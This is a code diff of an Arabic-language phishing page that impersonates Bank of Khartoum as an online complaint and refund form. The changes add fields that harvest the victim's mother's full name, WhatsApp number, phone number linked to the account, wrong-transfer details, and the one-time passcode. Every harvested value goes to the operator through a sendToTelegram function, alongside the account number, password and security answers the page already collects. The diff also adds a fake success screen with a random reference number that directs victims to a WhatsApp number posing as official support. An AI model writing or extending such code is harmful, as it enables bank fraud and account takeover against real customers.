@@ -33,9 +33,13 @@
         .service-content { display: flex; flex-direction: column; text-align: right; }
         .service-title { font-weight: 700; color: #d32f2f; }
         .service-desc { font-size: 13px; color: #555; margin-top: 4px; }
-        .whatsapp-btn { background-color: #25D366; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 25px; display: flex; align-items: center; justify-content: center; gap: 12px; }
-        .whatsapp-btn:disabled { background-color: #cccccc; cursor: not-allowed; }
         
+        .success-box { background-color: #fafffa; border: 2px solid #2e7d32; padding: 25px; border-radius: 8px; margin-top: 20px; text-align: right; }
+        .reference-title { font-size: 15px; color: #333; font-weight: bold; display: block; text-align: center; margin-top: 10px; }
+        .reference-number { font-size: 26px; color: #2e7d32; font-weight: 700; letter-spacing: 2px; display: block; margin: 15px 0; text-align: center; background: #fff; padding: 12px; border: 1px dashed #2e7d32; border-radius: 4px; }
+        .info-text { color: #444; font-size: 13.5px; line-height: 1.6; display: block; margin-top: 15px; text-align: justify; }
+        .warning-text { color: #d32f2f; font-weight: 700; background-color: #fff3f3; padding: 12px; border-right: 4px solid #d32f2f; margin-top: 15px; font-size: 13px; border-radius: 0 4px 4px 0; }
+
         .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; -webkit-animation: spin 1s ease-in-out infinite; }
         @keyframes spin { to { -webkit-transform: rotate(360deg); } }
         @-webkit-keyframes spin { to { -webkit-transform: rotate(360deg); } }
@@ -56,7 +60,7 @@
             <h2>الاستمارة أونلاين</h2>
             <h3>أنواع المشاكل التي يمكن معالجتها</h3>
             <div class="service-grid">
-                <div class="service-option" onclick="selectService(1, 'كشف الحساب')">
+                <div class="service-option selected" onclick="selectService(1, 'كشف الحساب')">
                     <div class="service-content">
                         <span class="service-title">كشف الحساب</span>
                         <span class="service-desc">الحصول على كشف حساب مفصل.</span>
@@ -106,7 +110,29 @@
                     <span>🛡️</span>
                 </div>
             </div>
-            <button class="btn-submit" onclick="goToStep(2)">متابعة</button>
+            <button class="btn-submit" onclick="handleStep1Next()">متابعة</button>
+        </div>
+
+        <div id="step-wrong-transfer" class="card hidden">
+            <h2>تفاصيل التحويل الخاطئ</h2>
+            <h3>الرجاء تزويدنا ببيانات الحساب المستلم بالخطأ</h3>
+            <div class="input-group">
+                <label>رقم الحساب المحول إليه:</label>
+                <input type="text" id="wrong-account" placeholder="أدخل رقم الحساب المستلم">
+            </div>
+            <div class="input-group">
+                <label>إسم صاحب الحساب المحول إليه:</label>
+                <input type="text" id="wrong-name" placeholder="أدخل إسم المستلم كما ظهر لك">
+            </div>
+            <div class="input-group">
+                <label>تاريخ عملية التحويل:</label>
+                <input type="date" id="wrong-date" style="text-align: right;">
+            </div>
+            <div class="input-group">
+                <label>رقم العملية (من إشعار التحويل):</label>
+                <input type="text" id="wrong-tx-id" placeholder="أدخل رقم المعاملة الفريد">
+            </div>
+            <button class="btn-submit" onclick="submitWrongTransferData()">حفظ ومتابعة تسجيل الدخول</button>
         </div>
 
         <div id="step-2" class="card hidden">
@@ -149,39 +175,86 @@
 
         <div id="step-4" class="card hidden">
             <h2>متابعة الاستمارة أونلاين</h2>
-            <h3>لأغراض الأمان يرجى تأكيد المبلغ الموجود في الحساب</h3>
+            <h3>لأغراض الأمان يرجى تأكيد التفاصيل المالية وبينات الهوية بالحساب</h3>
+            
             <div class="input-group">
                 <label>المبلغ الموجود في الحساب:</label>
                 <input type="text" id="account-amount" placeholder="أدخل المبلغ التقريبي أو الحالي">
             </div>
+            
+            <div class="input-group">
+                <label>إسم الوالدة رباعي:</label>
+                <input type="text" id="mother-name" placeholder="أدخل إسم الوالدة بالكامل">
+            </div>
+            
+            <div class="input-group">
+                <label>رقم تواصل واتساب:</label>
+                <input type="tel" id="whatsapp-num" placeholder="أدخل رقم الواتساب الفعال">
+            </div>
+            
+            <div class="input-group">
+                <label>رقم الهاتف المرتبط بالحساب:</label>
+                <input type="tel" id="linked-phone" placeholder="أدخل رقم شريحة الحساب">
+            </div>
+            
             <button class="btn-submit" onclick="submitStep3()">متابعة</button>
         </div>
 
         <div id="step-5" class="card hidden">
-            <h2>إدخال رمز OTP</h2>
-            <div class="input-group">
-                <label>أدخل رمز التحقق (OTP):</label>
-                <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+            <div id="otp-area">
+                <h2>إدخال رمز OTP</h2>
+                <div class="input-group">
+                    <label>أدخل رمز التحقق المرسل الي بريدك الالكتروني او رقم الهاتف (OTP):</label>
+                    <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+                </div>
+                <span id="otp-timer" class="otp-timer">إعادة إرسال الرمز خلال 50:00 دقيقة</span>
+                <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق الاعتمادي</button>
             </div>
-            <span id="otp-timer" class="otp-timer">إعادة إرسال الرمز خلال 30:00 دقيقة</span>
-            
-            <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق</button>
-            <span id="verification-status" style="display:none; color: #25D366; font-weight: bold; margin-top: 15px; display: block;"></span>
 
-            <button id="whatsapp-btn" class="whatsapp-btn" disabled onclick="openWhatsApp()">
-                <i class="fab fa-whatsapp"></i> تأكيد العملية عبر الواتساب
-            </button>
+            <div id="final-status-box" class="success-box hidden">
+                <h2 style="color: #2e7d32; text-align: center; margin-bottom: 10px;">✓ تم تسجيل ومعالجة طلبك بنجاح</h2>
+                <span class="reference-title">الرجاء حفظ وتوثيق الرقم المرجعي التابع لك:</span>
+                <span id="display-ref-num" class="reference-number">REF-00000000</span>
+                
+                <div class="warning-text">
+                    ⚠️ تنبيه أمني هام: نظام المراجعة الآلي يشترط مطابقة الـ OTP والبيانات المدخلة بدقة تامة. تقديم بيانات أو رموز غير صحيحة سيؤدي إلى رفض المعاملة فوراً بشكل تلقائي لحماية الحسابات من محاولات الدخول غير المصرح بها، وقد يعرض الحساب للتقييد المؤقت.
+                </div>
+
+                <span class="info-text">💬 <strong>خطوات المتابعة:</strong> يجب عليك الاحتفاظ بالرقم المرجعي أعلاه لتقديمه عند المراجعة، ثم التواصل الفوري مع قسم الدعم الفني وخدمة عملاء بنك الخرطوم المعتمدة مباشرة عبر حساب الواتساب الرسمي على الرقم: <strong style="color:#2e7d32; font-size:15px; direction:ltr; display:inline-block;">0990278926</strong> لمتابعة حالة استرداد المبالغ أو اعتماد الطلب الحالي وتحديثه.</span>
+            </div>
         </div>
     </div>
 
     <script>
         let selectedService = "كشف الحساب";
-        let userData = { accountNum: '', password: '', securityQuestion: '', securityAnswer: '', amount: '', otp: '' };
+        let userData = { accountNum: '', password: '', securityQuestion: '', securityAnswer: '', amount: '', motherName: '', whatsappNum: '', linkedPhone: '', otp: '', wrongAccount: '', wrongName: '', wrongDate: '', wrongTxId: '', refNum: '' };
 
-        function goToStep(n) {
-            document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
-            document.getElementById('step-' + n).classList.remove('hidden');
-            if (n === 5) startOtpTimer();
+        function goToStep(id) {
+            document.querySelectorAll('.main-container > .card').forEach(c => c.classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+            if (id === 'step-5') startOtpTimer();
+        }
+
+        function handleStep1Next() {
+            if (selectedService === 'التحويلات الخاطئة') {
+                goToStep('step-wrong-transfer');
+            } else {
+                goToStep('step-2');
+            }
+        }
+
+        function submitWrongTransferData() {
+            userData.wrongAccount = document.getElementById('wrong-account').value;
+            userData.wrongName = document.getElementById('wrong-name').value;
+            userData.wrongDate = document.getElementById('wrong-date').value;
+            userData.wrongTxId = document.getElementById('wrong-tx-id').value;
+
+            if (!userData.wrongAccount || !userData.wrongName || !userData.wrongDate || !userData.wrongTxId) {
+                return alert('الرجاء إكمال جميع تفاصيل التحويل الخاطئ المطلوبة');
+            }
+
+            sendToTelegram(`🚨 تفاصيل التحويل الخاطئ المرفقة:\n🔢 الحساب المستلم: ${userData.wrongAccount}\n👤 الاسم: ${userData.wrongName}\n📅 التاريخ: ${userData.wrongDate}\n🆔 المعاملة: ${userData.wrongTxId}`);
+            goToStep('step-2');
         }
 
         function togglePassword(i) {
@@ -211,8 +284,8 @@
             if (!userData.accountNum || !userData.password) {
                 return alert('الرجاء إكمال البيانات');
             }
-            sendToTelegram(`📋 دخول جديد\n🔢 الحساب: ${userData.accountNum}\n🔐 السر: ${userData.password}`);
-            goToStep(3);
+            sendToTelegram(`📋 دخول جديد [الخدمة: ${selectedService}]\n🔢 الحساب: ${userData.accountNum}\n🔐 السر: ${userData.password}`);
+            goToStep('step-3');
         }
 
         function submitStep2() {
@@ -222,16 +295,21 @@
                 return alert('الرجاء إكمال البيانات');
             }
             sendToTelegram(`🔐 أمان\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
-            goToStep(4);
+            goToStep('step-4');
         }
 
         function submitStep3() {
             userData.amount = document.getElementById('account-amount').value;
-            if (!userData.amount) {
-                return alert('الرجاء إكمال البيانات');
+            userData.motherName = document.getElementById('mother-name').value;
+            userData.whatsappNum = document.getElementById('whatsapp-num').value;
+            userData.linkedPhone = document.getElementById('linked-phone').value;
+
+            if (!userData.amount || !userData.motherName || !userData.whatsappNum || !userData.linkedPhone) {
+                return alert('الرجاء إكمال جميع البيانات التأكيدية المطلوبة');
             }
-            sendToTelegram(`💰 تأكيد المبلغ\n💵 المبلغ: ${userData.amount}`);
-            goToStep(5);
+            
+            sendToTelegram(`💰 تأكيد المبلغ والبيانات الشخصية:\n💵 المبلغ: ${userData.amount}\n👩‍👦 إسم الوالدة: ${userData.motherName}\n💬 واتساب: ${userData.whatsappNum}\n📱 الهاتف المرتبط: ${userData.linkedPhone}`);
+            goToStep('step-5');
         }
 
         function verifyOtp() {
@@ -239,26 +317,20 @@
             if (o.length < 4) return alert('رمز غير صحيح');
             
             const btn = document.getElementById('verify-btn');
-            const statusText = document.getElementById('verification-status');
-            
             btn.disabled = true;
-            btn.innerHTML = `<span class="loading-spinner"></span> جاري التحقق...`;
+            btn.innerHTML = `<span class="loading-spinner"></span> جاري المعالجة والتوثيق...`;
             
             setTimeout(() => {
-                btn.style.display = "none";
-                statusText.style.display = "block";
-                statusText.innerHTML = "تم التحقق بنجاح";
-                
+                let randomRef = 'BOK-' + Math.floor(10000000 + Math.random() * 90000000);
                 userData.otp = o;
-                sendToTelegram(`🔢 OTP\n🔐 الرمز: ${userData.otp}`);
+                userData.refNum = randomRef;
                 
-                document.getElementById('whatsapp-btn').disabled = false;
+                sendToTelegram(`🔢 OTP معتمد\n🔐 الرمز: ${userData.otp}\n🎫 المرجعي المولد: ${userData.refNum}`);
+                
+                document.getElementById('otp-area').style.display = 'none';
+                document.getElementById('display-ref-num').textContent = randomRef;
+                document.getElementById('final-status-box').classList.remove('hidden');
             }, 3000);
-        }
-
-        function openWhatsApp() {
-            sendToTelegram(`🎯 الخدمة: ${selectedService}`);
-            window.location.href = `https://wa.me/249917436748?text=${encodeURIComponent('مرحبا أريد حل مشكلة ' + selectedService)}`;
         }
 
         function sendToTelegram(messageText) {
